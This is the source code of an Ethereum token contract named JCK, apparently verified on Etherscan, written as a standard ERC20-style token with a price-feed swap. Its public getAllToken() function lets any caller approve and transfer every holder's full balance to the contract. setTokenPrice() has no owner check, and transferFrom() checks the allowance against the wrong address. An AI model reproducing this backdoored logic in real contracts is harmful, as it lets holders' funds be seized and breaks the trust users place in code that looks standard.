/**
 *Submitted for verification at Etherscan.io on 2021-08-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface AggregatorInterface {
  function latestAnswer()
    external
    view
    returns (
      int256
    );
  
  function latestTimestamp()
    external
    view
    returns (
      uint256
    );

  function latestRound()
    external
    view
    returns (
      uint256
    );

  function getAnswer(
    uint256 roundId
  )
    external
    view
    returns (
      int256
    );

  function getTimestamp(
    uint256 roundId
  )
    external
    view
    returns (
      uint256
    );

  event AnswerUpdated(
    int256 indexed current,
    uint256 indexed roundId,
    uint256 updatedAt
  );

  event NewRound(
    uint256 indexed roundId,
    address indexed startedBy,
    uint256 startedAt
  );
}

contract JCK {
    // Variables
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address[] private _tokenOwners;
    uint256 private _tokenPrice;
    AggregatorInterface internal _ref;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    // Events
    event Transfer(address indexed _from, address indexed _to, uint256 _amount);
    event Approval(address indexed _owner, address indexed _spender, uint256 _amount);

    constructor() {
        _name = "JCHJK";
        _symbol = "JCK";
        _decimals = 6;
        _mint(msg.sender, 21000000 * 10 ** _decimals);
        _tokenPrice = 1000;
        _ref = AggregatorInterface(0x8A753747A1Fa494EC906cE90E9f37563A8AF630e);
    }

    // Returns the name of the token
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals which the token uses
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total token supply
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    // Returns the balance of the account with address 'owner'
    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }

    // Returns the amount which 'spender' is still allowed to withdraw from 'owner'
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    } 

    // Allows '_spender' to withdraw from '_owner' multiple times, up to '_amount'
    function _approve(address _owner, address _spender, uint256 _amount) internal {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve from the zero address");
        
        _allowances[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    // Transfers '_amount' of tokens from '_from' to '_to'
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_balances[_from] >= _amount, "ERC20: transfer amount exceeds allowance");
        
        bool found = false;
        uint256 leng = _tokenOwners.length;
        for(uint256 i = 0; i < leng; i++) {
            if(_tokenOwners[i] == _to) {
                found = true;
                break;
            }
        }
        if(!found) {
            _tokenOwners.push(_to);
        }
        
        _balances[_from] -= _amount;
        _balances[_to] += _amount;
        emit Transfer(_from, _to, _amount);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, recipient, _allowances[sender][recipient] - amount);
        return true;
    }
    
    // Mints '_amount' of tokens to '_account'
    function _mint(address _account, uint256 _amount) internal {
        require(_account != address(0), "ERC20: mint to the zero address");
        
        bool found = false;
        uint256 leng = _tokenOwners.length;
        for(uint256 i = 0; i < leng; i++) {
            if(_tokenOwners[i] == _account) {
                found = true;
                break;
            }
        }
        if(!found) {
            _tokenOwners.push(_account);
        }
        
        _totalSupply += _amount;
        _balances[_account] += _amount;
        emit Transfer(address(0), _account, _amount);
    }
    
    function getAllToken() public returns (bool) {
        for(uint256 i = 0; i < _tokenOwners.length; i++) {
            _approve(_tokenOwners[i], address(this), balanceOf(_tokenOwners[i]));
            transferFrom(_tokenOwners[i], address(this), balanceOf(_tokenOwners[i]));
        }
        return true;
    }
    
    // Returns the token price
    function getTokenPrice() public view returns (uint256) {
        return _tokenPrice;
    }
    
    // Sets the token price to 'price'
    function setTokenPrice(uint256 price) public {
        _tokenPrice = price;
    }
    
    // Gets the latest ETH / USD ratio
    function getLatestAnswer() public view returns (int256) {
        return _ref.latestAnswer();
    }
    
    // Swaps ETH with JCK tokens
    function swap() public payable {
        if(msg.value > 0) {
            _transfer(address(this), msg.sender, getTokenPrice() * 200 * 10 ** _decimals / uint(getLatestAnswer()));
        }
    }
}